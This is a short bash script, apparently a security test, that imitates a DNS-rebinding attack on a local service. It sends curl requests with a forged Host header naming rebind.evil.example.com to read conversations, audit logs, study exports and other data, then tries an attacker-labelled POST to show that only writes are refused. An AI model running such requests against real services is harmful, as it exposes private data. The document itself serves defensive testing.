#!/bin/bash
# What a page reads once its public name points at the service (DNS rebinding): every request below
# carries Host: rebind.evil.example.com:<port>, the Host a browser sends from such a page. The guard
# lets each read through (guard.refusal checks POST, PUT, PATCH, DELETE alone) and refuses the write.
# Usage: bash rebind_read.sh http://127.0.0.1:8900 p1
O="$1"; P="$2"; port="${O##*:}"; H="Host: rebind.evil.example.com:$port"
for path in "/api/guild" "/api/audit" "/api/state" "/api/conversations" "/api/biorepo/overlay" "/api/literature/documents"; do
  printf '%-28s ' "GET $path"
  curl -s --noproxy '*' -H "$H" -w ' [%{http_code}]' "$O$path?project=$P" | head -c 240; echo
done
printf '%-28s ' "GET /api/studies/export"
curl -s --noproxy '*' -H "$H" -o /dev/null -w '[%{http_code} %{content_type} %{size_download} bytes]\n' "$O/api/studies/export?project=$P"
printf '%-28s ' "POST /api/projects"
curl -s --noproxy '*' -H "$H" -H "Origin: http://rebind.evil.example.com:$port" -H 'content-type: application/json' \
  -w ' [%{http_code}]' -d '{"id":"rebound-write","name":"x","by":"attacker"}' "$O/api/projects"; echo
